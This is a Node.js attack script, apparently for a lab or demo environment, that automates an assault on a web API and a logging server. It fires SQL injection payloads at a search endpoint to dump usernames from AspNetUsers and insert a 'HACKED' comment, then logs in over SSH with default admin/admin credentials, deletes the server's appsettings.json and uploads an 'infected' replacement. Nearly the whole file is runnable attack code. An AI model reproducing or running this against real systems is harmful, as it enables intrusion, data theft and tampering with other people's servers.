const fs = require('fs')
const path = require('path')
const {NodeSSH} = require('node-ssh');
const { resolve } = require('path');
const RandExp = require('randexp');
const f = require('node-fetch');

const ssh = new NodeSSH()
const API_IP = process.env.API_IP || "localhost";
const API_PORT = process.env.API_PORT || 8081;
const LOGS_IP = process.env.LOGS_IP || "localhost";
const LOGS_SSH_PORT = process.env.LOGS_SSH_PORT || 8022;

const sleep = (time) => {
  return new Promise(resolve => setTimeout(resolve,time));
}

const AttackAPI = async () => {
  let success = false;
  let link = "";
  const path = "/home/Search?searchData=";
  while(!success){
    //const query = (Math.floor(Math.random()*100) === 0) ?  `%';Select * from Comments where Comment like '%`: new RandExp('/<([a-z]\w{0,20})>HACK</([a-z]\w{0,20})>/').gen();
	const query = (Math.floor(Math.random()*100) === 0) ?  `' UNION ALL SELECT username FROM AspNetUsers;`: new RandExp('/<([a-z]\w{0,20})>HACK</([a-z]\w{0,20})>/').gen();
    console.log("Attacking API with : " + query);
    link = "http://"+API_IP+":"+API_PORT+path+query;
    const request = await f(link, {method : 'GET'});
    try{
      const json = await request.json();
      success = (json.length > 0);
	  console.log(json);
    }
    catch(err){
      continue;
    };
    await sleep(250);
  }
  console.log("FOUND INJECTION BACKDOOR WITH ", link);
  console.log("INJECTING HACKING COOKIE");
  const hackQuery = "http://"+API_IP+":"+API_PORT+path+`' UNION ALL SELECT username FROM AspNetUsers; INSERT INTO Comments (CommentId,UserId,Comment) VALUES ("HACK1","HACK2","HACKED_BY_HOMICIDAL_FERRET");`;
  await f(hackQuery, {method : 'GET'});
  console.log("Hacked API succesfully");
}

const SSHIntoLogs = async () => {
  ssh.connect({
    host: LOGS_IP,
    port: LOGS_SSH_PORT,
    username : 'admin',
    password : 'admin',
  }).then( async () =>{
    console.log("SSH CONNECTION TO LOGS SUCCESSFULL");
    console.log("SEARCHING FOR CONFIG FILE\n\n");
    ssh.execCommand("ls /").then(({stdout}) => console.log(stdout));
    console.log("FOUND APP FOLDER, SEARCHING DIRECTORY \n\n");
    await ssh.execCommand("ls /app").then(({stdout}) => console.log(stdout));;
    console.log("FOUND CONFIG FILE, DELETING AND REPLACING WITH INFECTED CONFIG");
    await ssh.execCommand('sudo rm /app/appsettings.json');
    await ssh.putFile("./infectedAppSettings.json", '/app/appsettings.json');
    console.log("INFECTED LOGS MACHINE")
  }).catch((error) =>{
    console.error("Something went wrong : ", error);
  })
}


(async () =>{
  console.error("LEPINE HACKING BEGINS");
  console.log(API_IP,API_PORT);
  await sleep(10000);
  SSHIntoLogs();
  await sleep(10000);
  AttackAPI();
})();
